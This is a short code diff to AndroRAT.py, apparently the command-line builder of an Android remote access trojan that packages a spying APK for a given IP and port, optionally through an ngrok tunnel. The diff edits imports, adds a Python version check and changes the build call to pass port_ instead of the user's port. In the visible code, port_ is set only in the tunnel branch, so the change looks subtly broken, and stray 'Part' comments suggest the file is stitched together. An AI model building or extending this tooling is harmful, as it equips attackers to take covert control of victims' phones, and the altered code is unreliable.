@@ -5,16 +5,13 @@ from utils import *
 import argparse
 import sys
 import platform
-import socket
-import os
-
 try:
     from pyngrok import ngrok, conf
 except ImportError as e:
     print(stdOutput("error") + "\033[1mpyngrok not found")
     print(stdOutput("info") + "\033[1mRun pip3 install -r requirements.txt")
     exit()
-
+    
 clearDirec()
 
 #                     _           _____         _______
@@ -38,7 +35,9 @@ parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Ente
 parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
 args = parser.parse_args()
 
-# Removed the Python version check to ensure compatibility with any latest version of Python
+if float(platform.python_version()[:3]) < 3.6:
+    print(stdOutput("error") + "\033[1mPython version should be 3.6 or above")
+    sys.exit()
 
 # Part 2: End of AndroRAT.py
 # Part 3: Start of AndroRAT.py
@@ -57,7 +56,7 @@ if args.build:
         build(ip, port, args.output, True, port_, icon)
     else:
         if args.ip and args.port:
-            build(args.ip, args.port, args.output, False, None, icon)
+            build(args.ip, port_, args.output, False, None, icon)
         else:
             print(stdOutput("error") + "\033[1mArguments Missing")
 
